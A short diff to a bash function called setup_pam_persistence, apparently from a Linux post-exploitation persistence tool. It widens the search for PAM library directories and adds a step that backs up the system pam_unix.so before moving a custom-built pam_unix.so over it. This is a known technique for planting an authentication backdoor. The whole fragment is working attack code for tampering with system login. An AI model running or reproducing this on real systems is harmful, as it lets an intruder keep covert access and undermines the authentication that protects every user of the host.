@@ -215,9 +215,11 @@ setup_pam_persistence() {
 			local dest_dir=""
 			local possible_dirs=(
 				"/lib/security"
-				"/usr/lib64/security"
-				"/lib/x86_64-linux-gnu/security"
 				"/lib64/security"
+				"/lib/x86_64-linux-gnu/security"
+				"/usr/lib/security"
+				"/usr/lib64/security"
+				"/usr/lib/x86_64-linux-gnu/security"
 			)
 
 			for dir in "${possible_dirs[@]}"; do
@@ -231,6 +233,9 @@ setup_pam_persistence() {
 				echo "[-] Could not detect a valid PAM library directory."
 				exit 1
 			fi
+
+			echo "[+] Backing up original PAM library..."
+			mv -f "$dest_dir/pam_unix.so" "$dest_dir/pam_unix.so.bak"
 
 			echo "[+] Copying PAM library to $dest_dir..."
 			mv -f modules/pam_unix/.libs/pam_unix.so "$dest_dir"
